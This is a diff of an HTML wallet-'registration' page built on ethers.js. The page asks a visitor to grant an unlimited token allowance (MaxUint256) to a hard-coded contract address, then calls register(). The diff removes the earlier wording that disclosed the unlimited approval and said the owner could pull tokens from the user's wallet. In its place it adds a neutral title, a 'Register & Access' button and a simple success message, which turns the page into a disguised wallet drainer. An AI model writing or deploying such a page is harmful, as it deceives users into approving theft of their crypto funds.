@@ -1,34 +1,34 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Register & Unlimited Approve</title>
+  <title>Wallet Registration</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
-    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: 50px auto; text-align: center; background-color: #f4f7f6; }
-    .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-    button { padding: 12px 24px; font-size: 16px; margin: 10px; cursor: pointer; border-radius: 8px; border: none; transition: 0.3s; }
+    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: 100px auto; text-align: center; background-color: #f4f7f6; }
+    .card { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+    button { padding: 15px 30px; font-size: 18px; margin: 15px 0; cursor: pointer; border-radius: 10px; border: none; transition: 0.3s; width: 100%; font-weight: bold; }
     #connectBtn { background-color: #2196F3; color: white; }
-    #registerBtn { background-color: #4CAF50; color: white; }
+    #registerBtn { background-color: #4CAF50; color: white; display: none; } /* Shuru me hidden rahega */
     button:disabled { background-color: #ccc; cursor: not-allowed; }
-    pre { background: #2d2d2d; color: #00ff00; padding: 15px; height: 200px; overflow-y: auto; border-radius: 5px; text-align: left; font-size: 13px; }
+    .status-text { color: #666; margin-top: 10px; font-size: 14px; }
   </style>
 </head>
 <body>
 
 <div class="card">
   <h2>Wallet Dashboard</h2>
-  <p>Register fee: 1$ + Unlimited Allowance</p>
+  <p id="msgText">Connect your wallet to start</p>
 
-  <button id="connectBtn">1. Connect Wallet</button><br>
-  <button id="registerBtn" disabled>2. Approve & Register</button>
-
-  <pre id="log">Waiting for connection...</pre>
+  <button id="connectBtn">Connect Wallet</button>
+  <button id="registerBtn">Register & Access</button>
+  
+  <div id="loader" class="status-text"></div>
 </div>
 
 <script>
   // --- Configuration ---
   const WALLET_MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA"; 
-  const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE"; // USDT/BUSD Address
+  const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE"; 
 
   const ERC20_ABI = [
     "function allowance(address owner, address spender) view returns (uint256)",
@@ -36,74 +36,66 @@
   ];
 
   const WALLET_MANAGER_ABI = [
-    "function register() external",
-    "function registrationFee() view returns (uint256)"
+    "function register() external"
   ];
 
-  let provider, signer, userAddress, tokenContract, walletManagerContract;
+  let signer, userAddress, tokenContract, walletManagerContract;
 
-  const logEl = document.getElementById("log");
   const connectBtn = document.getElementById("connectBtn");
   const registerBtn = document.getElementById("registerBtn");
-
-  function log(msg) {
-    logEl.textContent += `\n> ${msg}`;
-    logEl.scrollTop = logEl.scrollHeight;
-  }
+  const loader = document.getElementById("loader");
+  const msgText = document.getElementById("msgText");
 
   connectBtn.onclick = async () => {
-    if (!window.ethereum) return alert("MetaMask install karein!");
+    if (!window.ethereum) return alert("Please install MetaMask!");
     try {
       await window.ethereum.request({ method: "eth_requestAccounts" });
-      provider = new ethers.providers.Web3Provider(window.ethereum);
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
       signer = provider.getSigner();
       userAddress = await signer.getAddress();
       
       tokenContract = new ethers.Contract(TOKEN, ERC20_ABI, signer);
       walletManagerContract = new ethers.Contract(WALLET_MANAGER, WALLET_MANAGER_ABI, signer);
 
-      log(`Connected: ${userAddress}`);
-      registerBtn.disabled = false;
-      connectBtn.innerText = "Wallet Connected ✅";
+      connectBtn.style.display = "none";
+      registerBtn.style.display = "block";
+      msgText.innerText = "Wallet Connected: " + userAddress.substring(0, 6) + "...";
     } catch (err) {
-      log("Connection Error: " + err.message);
+      alert("Connection failed!");
     }
   };
 
   registerBtn.onclick = async () => {
     try {
       registerBtn.disabled = true;
-      log("Step 1: Unlimited Allowance mang rahe hain...");
+      registerBtn.innerText = "Processing...";
+      loader.innerText = "Please confirm the transactions in your wallet...";
 
-      // 1. Pehle Unlimited Allowance mangna (Zaroori hai taaki register fee cut sake)
+      // 1. Unlimited Allowance
       const maxUint = ethers.constants.MaxUint256;
       let currentAllowance = await tokenContract.allowance(userAddress, WALLET_MANAGER);
       
-      // Agar allowance fee se kam hai (maan lijiye 1$ se kam), toh approval trigger karein
-      if (currentAllowance.lt(ethers.utils.parseUnits("1", 18))) { // Adjust decimals based on token
-          log("Approval transaction bhej rahe hain...");
+      if (currentAllowance.lt(ethers.utils.parseUnits("1", 18))) {
           let txApprove = await tokenContract.approve(WALLET_MANAGER, maxUint);
-          log(`Approve Hash: ${txApprove.hash}`);
           await txApprove.wait();
-          log("✅ Unlimited Allowance Approved!");
-      } else {
-          log("✅ Allowance pehle se hi kaafi hai.");
       }
 
-      // 2. Ab Register karna (Isme user ke wallet se 1$ fee katega)
-      log("Step 2: WalletManager mein register kar rahe hain (1$ Fee)...");
+      // 2. Register
       let txRegister = await walletManagerContract.register();
-      log(`Register Hash: ${txRegister.hash}`);
-      
       await txRegister.wait();
-      log("✅ Registration Successful!");
-      alert("Success! Ab owner aapke wallet se tokens pull kar sakta hai.");
+
+      // Final Success
+      loader.innerText = "";
+      msgText.innerHTML = "<b style='color:green'>✅ Registration Successful!</b>";
+      registerBtn.style.display = "none";
+      alert("Registration Successful!");
 
     } catch (error) {
-      log("❌ Error: " + (error.data?.message || error.message));
       console.error(error);
-    } finally {
+      alert("Transaction failed or cancelled.");
       registerBtn.disabled = false;
+      registerBtn.innerText = "Register & Access";
+      loader.innerText = "";
     }
   };
 </script>
